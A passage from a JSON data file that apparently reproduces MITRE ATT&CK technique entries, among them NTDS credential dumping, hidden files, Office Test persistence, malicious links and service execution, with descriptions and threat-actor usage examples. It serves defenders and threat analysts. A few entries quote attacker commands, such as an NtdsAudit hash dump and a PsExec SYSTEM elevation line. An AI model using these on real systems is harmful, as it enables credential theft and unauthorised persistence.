    "description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.C2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies)Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)Hiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense)",
    "similar_words": [
      "Hide Infrastructure"
    ],
    "id": "T1665"
  },
  "attack-pattern--ec4be82f-940c-4dcb-87fe-2bbdd17c692f": {
    "name": "Scan Databases",
    "example_uses": [
      "uses the Chinese website fofa.su similar to the Shodan scanning service for passive scanning of victims.",
      "used internet scan data for target development.",
      "has used FOFA Shodan and Censys to search for exposed victim infrastructure."
    ],
    "description": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
    "similar_words": [
      "Scan Databases"
    ],
    "id": "T1596.005"
  },
  "attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d": {
    "name": "Hidden Files and Directories",
    "example_uses": [
      "has placed its payload in hidden subdirectories.",
      "uses a hidden folder named .xcassets and .git to embed itself in Xcode.",
      "has saved files with hidden file attributes.",
      "has the ability to set its file attributes to hidden.",
      "has used malware to store malicious binaries in hidden directories on victim's USB drives.",
      "has copied a random file from the Windows System32 folder to the %APPDATA% location under a different hidden filename.",
      "can modify the characteristics of folders to hide them from the compromised user.",
      "has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.",
      "downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc /private/tmp/.info.py /private/tmp/.server.sh ~/Library/LaunchAgents/.espl.plist ~/Library/Containers/.[random string]/[random string].",
      "variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data.",
      "has the ability to hide and unhide files.",
      "has added a leading . to plist filenames unlisting them from the Finder app and default Terminal directory listings.",
      "has executed a .command script from a hidden directory in a mounted DMG.",
      "has created a hidden directory under C:\\ProgramData\\Apple\\Updates\\ and C:\\Users\\Public\\Documents\\Flash\\.",
      "hides a copy of itself in the user's ~/Library directory by using a . at the beginning of the file name followed by 9 random characters.",
      "downloaded a file libprocesshider which could hide files on the target system.",
      "has set the attributes of the VirtualBox directory and VBoxVmService parent directory to hidden.",
      "has the ability to set file attributes to hidden to hide files from the compromised user's view in Windows File Explorer.",
      "sets the main loader files attributes to hidden.",
      "can create hidden system directories.",
      "has created hidden files and folders within a compromised Linux system `/tmp` directory.  also has used `attrib.exe` to hide gathered local host information.",
      "can use hidden directories and files to hide malicious executables.",
      "has a dynamic debugging feature to set the file attribute to hidden.",
      "has created a hidden directory on targeted systems naming it after the current local time (year month and day).",
      "sets its own executable file's attributes to hidden.",
      "stores itself in ~/Library/.DS_Stores/",
      "can hide legitimate directories and replace them with malicious copies of the same name.",
      "Before exfiltration 's backdoor has used hidden files to store logs and outputs from backdoor commands.",
      "has created hidden folders.",
      "has created a hidden file in the Startup folder of the current user.",
      "uses attrib +h to make some of its files hidden.",
      "can copy itself to and launch itself from hidden folders.",
      "has hidden files on a compromised host.",
      "has the ability to copy itself to a hidden file and directory.",
      "saves itself with a leading . so that it's hidden from users by default.",
      "has the ability to set file attributes to hidden.",
      "saves itself with a leading . to make it a hidden file.",
      "has the ability to set folders or files to be hidden from the Windows Explorer default view.",
      "can set attributes of log files and directories to HIDDEN SYSTEM ARCHIVE or a combination of those.",
      "macOS backdoor hides the clientID file via a chflags function.",
      "creates and installs itself to a hidden installation directory.",
      "initial installation involves dropping several files to a hidden directory named after the victim machine name.",
      "uses a hidden directory named .calisto to store data from the victims machine before exfiltration.",
      "has commonly set file and path attributes to hidden.",
      "creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.",
      "has had its payload named with a dot prefix to make it hidden from view in the Finder application.",
      "can modify file attributes to hide files.",
      "The  payload is stored in a hidden directory at /Users/Shared/.local/kextd.",
      "has been created with a hidden attribute to insure it's not visible to the victim.",
      "has the capability to exfiltrate stolen data to a hidden folder on a removable drive.",
      "added the hidden file attribute to original files manipulating victims to click on malicious LNK files.",
      "has copied its binary and the victim's scraped password into a hidden folder in the `/Users` directory.",
      "uses  +h to make some of its files hidden.",
      "stored encrypted payloads associated with  installation in hidden directories during .",
      "can be used to make files or directories hidden.",
      "initial installation involves dropping several files to a hidden directory named after the victim machine name. Additionally  uses  to hide a directory in the following command: ` C:\\Windows\\system32\\attrib.exe +h C:/rjtu/`."
    ],
    "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a hidden file. These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).On Linux and Mac, users can mark specific files as hidden simply by putting a . as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ., are by default hidden from being viewed in the Finder application and standard command-line utilities like ls. Users must specifically change settings to have these files viewable.Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesnt clutter up the users workspace. For example, SSH utilities create a .ssh folder thats hidden and contains the users known hosts and keys.Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
    "similar_words": [
      "Hidden Files and Directories"
    ],
    "id": "T1564.001"
  },
  "attack-pattern--ed2e45f9-d338-4eb2-8ce5-3a2e03323bc1": {
    "name": "Create Snapshot",
    "example_uses": [
      "can create snapshots of EBS volumes and RDS instances."
    ],
    "description": "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)",
    "similar_words": [
      "Create Snapshot"
    ],
    "id": "T1578.001"
  },
  "attack-pattern--ed730f20-0e44-48b9-85f8-0e2adeb76867": {
    "name": "Determine Physical Locations",
    "example_uses": [
      "has collected location information from visitors to their phishing sites."
    ],
    "description": "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",
    "similar_words": [
      "Determine Physical Locations"
    ],
    "id": "T1591.001"
  },
  "attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a": {
    "name": "Office Test",
    "example_uses": [
      "has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\\Software\\Microsoft\\Office test\\Special\\Perf to execute code."
    ],
    "description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)There exist user and global Registry keys for the Office Test feature, such as:* HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\PerfAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
    "similar_words": [
      "Office Test"
    ],
    "id": "T1137.002"
  },
  "attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf": {
    "name": "Develop Capabilities",
    "example_uses": [
      "created and used a mailing toolkit to use in spearphishing attacks.",
      "developed malicious npm packages for delivery to or retrieval by victims."
    ],
    "description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
    "similar_words": [
      "Develop Capabilities"
    ],
    "id": "T1587"
  },
  "attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24": {
    "name": "NTDS",
    "example_uses": [
      "has used the ntdsutil.exe utility to export the Active Directory database for credential access.",
      "can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI) or Volume Shadow Copy.",
      "has extracted the `NTDS.dit` file by creating volume shadow copies of virtual domain controller disks.",
      "has used `ntdsutil.exe` to back up the Active Directory database likely for credential access.",
      "has harvested the NTDS.DIT file and leveraged the  tool on the compromised domain controller to locally decrypt it.",
      "can copy `ntds.dit` using the Volume Shadow Copy service.",
      "has used Metasploits  NTDSGRAB module to obtain a copy of the victim's Active Directory database.",
      "has used ntds.util to create domain controller installation media containing usernames and password hashes.",
      "has used Ntdsutil to dump credentials.",
      "has gathered the SYSTEM registry and ntds.dit files from target systems.  specifically has used the NtdsAudit tool to dump the password hashes of domain users via msadcs.exe NTDS.dit -s SYSTEM -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv and used ntdsutil to copy the Active Directory database.",
      "SecretsDump and  modules within  can perform credential dumping to obtain account and password information from NTDS.dit.",
      "has used Volume Shadow Copy to access credential information from NTDS.",
      "During  threat actors accessed and mounted virtual hard disk backups to extract ntds.dit.",
      "has gained access to credentials via exported copies of the ntds.dit Active Directory database.  has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility ntdsutil.",
      "has dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers.",
      "can gather hashed passwords by gathering domain controller hashes from NTDS.",
      "used ntdsutil to obtain a copy of the victim environment ntds.dit file.",
      "has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file.  has also used reg save on the SYSTEM file Registry location to help extract the NTDS.dit file.",
      "has used NTDSDump and other password dumping tools to gather credentials.",
      "has stolen copies of the Active Directory database (NTDS.DIT).",
      "has used Windows built-in tool `ntdsutil` to extract the Active Directory (AD) database.",
      "During   dumped NTDS.dit through creating volume shadow copies via vssadmin.",
      "During  threat actors obtained active directory credentials via the NTDS.DIT file."
    ],
    "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller.(Citation: Wikipedia Active Directory)In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.* Volume Shadow Copy* secretsdump.py* Using the in-built Windows tool, ntdsutil.exe* Invoke-NinjaCopy",
    "similar_words": [
      "NTDS"
    ],
    "id": "T1003.003"
  },
  "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5": {
    "name": "SNMP (MIB Dump)",
    "example_uses": [],
    "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
    "similar_words": [
      "SNMP (MIB Dump)"
    ],
    "id": "T1602.001"
  },
  "attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235": {
    "name": "Steganography",
    "example_uses": [
      "has used steganography to hide its C2 communications.",
      "is controlled via commands that are appended to image files.",
      "can encode binary data into a .PNG file for C2 communication.",
      "During   used steganography to hide the communications between the implants and their C&C servers.",
      "has used the .PNG file format for C2 communications.",
      "is controlled via commands that are embedded into PDFs and JPGs using steganographic methods.",
      "has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.",
      "can use steganography to hide malicious code downloaded to the victim.",
      "can process steganographic images attached to email messages to send and receive C2 commands.  can also embed additional messages within BMP images to communicate with the  operator.",
      "When the  command and control is operating over HTTP or HTTPS Duqu uploads data to its controller by appending it to a blank JPG file.",
      "C2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob.",
      "can receive C2 commands hidden in the structure of .jpg and .gif images.",
      "can parse IDAT chunks from .png files to look for zlib-compressed and AES encrypted C2 commands."
    ],
    "description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ",
    "similar_words": [
      "Steganography"
    ],
    "id": "T1001.002"
  },
  "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9": {
    "name": "Malicious Link",
    "example_uses": [
      "has used malicious links to lure victims into downloading malware.",
      "has used e-mails with malicious links to lure victims into installing malware.",
      "has used malicious links to gain execution on victim machines.",
      "can gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs.",
      "During  threat actors enticed users to click on links in spearphishing emails to download malware.",
      "has sent malicious links including links directing victims to a Google Drive folder.",
      "has sent malicious links via email trick users into opening a RAR archive and running an executable.",
      "has used links embedded in e-mails to lure victims into executing malicious code.",
      "has relied on a user to click a malicious link within a spearphishing email.",
      "has lured victims into clicking malicious links.",
      "has relied upon users clicking on links to malicious files.",
      "has lured victims into clicking on a malicious link sent through spearphishing.",
      "During  the threat actors relied on a victim to click on a malicious link distributed via phishing emails.",
      "During  the threat actors relied on a victim clicking on a malicious link sent via email.",
      "has been executed through convincing victims into clicking malicious links.",
      "During   lured users into executing a malicious link to disclose private account information or provide initial access.",
      "has relied on victims to click on a malicious link send via phishing campaigns.",
      "has gained execution through users opening malicious links.",
      "has relied upon users clicking on a malicious link delivered through phishing.",
      "has achieved execution through victims clicking links to malicious websites.",
      "During  the threat actors lured users into clicking a malicious link which led to the download of a ZIP archive containing a malicious .LNK file.",
      "has relied upon users clicking on a malicious link delivered through phishing.",
      "has used emails with malicious links to lure victims into installing malware.",
      "has used malicious links to cloud and web services to gain execution on victim machines.",
      "has used various forms of spearphishing attempting to get a user to click on a malicous link.",
      "has used spearphishing with links to try to get users to click download and open malicious files.",
      "has lured victims into clicking malicious links delivered through spearphishing.",
      "has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.",
      "has been executed through luring victims into clicking malicious links.",
      "has used lures to get users to click links in emails and attachments. For example  makes their malware look like legitimate Microsoft Word documents .pdf and/or .lnk files.",
      "has lured victims into clicking malicious Dropbox download links delivered through spearphishing.",
      "has gained execution on targeted systems through luring users to click on links to malicious URLs.",
      "has attempted to lure victims into opening malicious links embedded in emails.",
      "has sent spearphishing emails in an attempt to lure users to click on a malicious link.",
      "has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.",
      "spearphishing emails required a user to click the link to connect to a compromised website.",
      "During   relied on student targets to click on a malicious link sent via email.",
      "has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).",
      "has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.",
      "has leveraged multiple types of spearphishing in order to attempt to get a user to open links.",
      "has used spearphishing via a link to get users to download and run their malware.",
      "has relied upon users clicking on a malicious link delivered through spearphishing.",
      "has delivered malicious links to achieve execution on the target system.",
      "has used malicious links to lure users into executing malicious payloads.",
      "has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.",
      "has attempted to lure targets into clicking links in spoofed emails from legitimate banks.",
      "has lured victims into interacting with malicious links on compromised websites for execution.",
      "has been executed via malicious links in e-mails.",
      "has relied on victims clicking on a malicious link delivered via email.",
      "has used malicious links in e-mails to lure victims into downloading malware.",
      "has directed users to open URLs hosting malicious content.",
      "has been executed through malicious links within spearphishing emails.",
      "has distributed URLs in phishing e-mails that link to lure documents.",
      "has lured victims into clicking a malicious link delivered through spearphishing.",
      "has relied upon users clicking on links to malicious documents.",
      "has has relied on users opening malicious links delivered through spearphishing to execute malware.",
      "has relied upon a user downloading a file from a OneDrive link for execution.",
      "has lured users into downloading malware through malicious links in fake advertisements and spearphishing emails.",
      "has been executed via malicious links embedded in e-mails spoofing the Ministries of Education Culture Sports Science and Technology of Japan.",
      "has lured targets to click on malicious links to gain execution in the target environment.",
      "has gained execution through victims opening malicious links.",
      "has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.",
      "has gained execution through victims opening malicious links.",
      "has relied on users to click on a malicious link delivered via a spearphishing.",
      "has compromised victims via links to URLs hosting malicious content.",
      "has lured users to click links to malicious HTML applications delivered via spearphishing emails.",
      "has sent spearphishing email links attempting to get a user to click.",
      "has attempted to lure users to click on a malicious link within a spearphishing email.",
      "spearphishing links required user interaction to navigate to the malicious website.",
      "has sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader.",
      "has in addition to email-based phishing attachments used malicious websites masquerading as legitimate entities to host links to malicious files for user execution.",
      "has been executed through malicious links distributed in email campaigns.",
      "distributed a PDF attachment containing a malicious link to a  installer.",
      "has used various forms of spearphishing attempting to get a user to click on a malicious link.",
      "has been executed through malicious links presented to users as internet search results.",
      "has used malicious links to infect the victim machines.",
      "has placed malicious links in contact forms on victim sites often spoofing a copyright complaint to redirect users to malicious file downloads.",
      "has used strategic website compromise to deliver a malicious link requiring user interaction.",
      "has attempted to get users to click on a link pointing to a malicious HTML file leading to follow-on malicious content.",
      "has lured users into executing malicious JavaScript files by sending malicious links via email.",
      "has mimicked legitimate government-related domains to deliver malicious webpages containing links to documents or other content for user execution.",
      "has used links to execute a malicious Visual Basic script.",
      "distributed hyperlinks that would result in an MSC file running a PowerShell command to download and install a remotely-hosted MSI file during ."
    ],
    "description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).",
    "similar_words": [
      "Malicious Link"
    ],
    "id": "T1204.001"
  },
  "attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51": {
    "name": "Application Access Token",
    "example_uses": [
      "can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts.",
      "can use legitimate OAuth refresh tokens to authenticate with OneDrive.",
      "During the   used compromised service principals to make changes to the Office 365 environment.",
      "has used several malicious applications that abused OAuth access tokens to gain access to target email accounts including Gmail and Yahoo Mail.",
      "has abused service principals with administrative permissions for data exfiltration."
    ],
    "description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victims primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured  for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a users AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
    "similar_words": [
      "Application Access Token"
    ],
    "id": "T1550.001"
  },
  "attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4": {
    "name": "LSASS Driver",
    "example_uses": [
      "drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.",
      "establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk."
    ],
    "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
    "similar_words": [
      "LSASS Driver"
    ],
    "id": "T1547.008"
  },
  "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4": {
    "name": "Service Execution",
    "example_uses": [
      "uses  to execute a payload or commands on a remote host.",
      "tries to elevate privileges to SYSTEM using PsExec to locally execute as a service such as cmd /c c:\\temp\\PsExec.exe -accepteula -j -d -s [Target Binary].",
      "can use  to execute a payload on a remote host. It can also use Service Control Manager to start new services.",
      "has used Windows services as a way to execute its malicious payload.",
      "uses svchost.exe to execute a malicious DLL included in a new service group.",
      "can create Windows system services for execution.",
      "can use  to help propagate itself across a network.",
      "has used  to deploy beacons on compromised systems.",
      "can execute commands remotely by creating a new service on the remote system.",
      "can use `OpenRemoteServiceManager` to create a service.",
      "can install itself as a service on compromised machines.",
      "drops a file named infpub.datinto the Windows directory and is executed through SCManager and rundll.exe.",
      "has used sc.exe to execute a service that it creates.",
      "has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.",
      "contains an implementation of  for remote execution.",
      "can create a remote service let it run once and then delete it.",
      "can be used to execute binaries on remote systems by creating and starting a service.",
      "During  threat actors created services on remote systems for execution purposes.",
      "installs a service on the remote system executes the command then uninstalls the service.",
      "can start stop or delete services.",
      "can create and start services on a compromised host.",
      "registers itself as a service on the victims machine to run as a standalone process.",
      "The net start and net stop commands can be used in  to execute or stop Windows services.",
      "has the capability to start services.",
      "can execute its service if the Service key exists. If the key does not exist  will create and run the service.",
      "contains various modules emulating other service execution tools such as .",
      "has the ability to start and stop a specified service.",
      "creates a new service named ntssrv to execute the payload.  can also spread via .",
      "can use  to execute a payload on a remote host.",
      "loader can create a new service named NtmsSvc to execute the payload.",
      "used svchost.exe and  to execute a system service installed to launch a  BEACON loader.",
      "has used  to install a service on the remote system.",
      "has used a tool known as RemoteExec (similar to ) to remotely execute batch scripts and binaries.",
      "has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the wercplsupport service.",
      "has used svchost.exe to execute a malicious DLL .",
      "can download and execute AdvancedRun.exe via `sc.exe`.",
      "uses services.exe to register a new autostart service named Audit Service using a copy of the local lsass.exe file.",
      "uses  to perform remote service manipulation to execute a copy of itself as part of lateral movement.",
      "started the cryptomining virtual machine as a service on the infected machine.",
      "has used  to copy and execute the ransomware.",
      "During  threat actors ran sc start to start the COMSysApp as part of the service hijacking and sc stop to stop and reconfigure the COMSysApp.",
      "can run as a service using svchost.exe.",
      "backdoor has used Windows services as a way to execute its malicious payload.",
      "has the ability to install itself as a Windows service.",
      "Microsoft Sysinternals  is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.",
      "can run a command on another machine using .",
      "has created Windows services to execute encoded PowerShell commands.",
      "dispatcher can be executed as a service.",
      "utilizes  to help propagate itself across a network.",
      "can execute itself as a service.",
      "can create system services to aid in executing the payload.",
      "Operators deploying  have used psexec and certutil to retrieve the  payload.",
      "can install a service to execute itself as a service.",
      "can manage services and processes.",
      "can create a new service for execution.",
      "has created new services or modified existing ones to run executables commands or scripts.",
      "has used `services.exe` to execute scripts and executables during lateral movement within a victim's network.  has also used batch scripts that leverage  to execute a previously transferred ransomware payload on a victim's network.",
      "can create and execute services to load its payload.",
      "has run a file encryption executable via `Service Control Manager/7045;winupd%SystemRoot%\\winupd.exeuser mode servicedemand startLocalSystem`.",
      "can be executed as a service using various names such as ScDeviceEnums.",
      "is run as a Windows service in victim environments.",
      "used Windows services to execute .",
      "used intermediate loader malware such as YouieLoader and SplitLoader that create malicious services.",
      "can use  to execute commands and payloads.",
      "executed and installed  as a Windows service.",
      "created malicious services for ransomware execution.",
      "executes as a service when deployed."
    ],
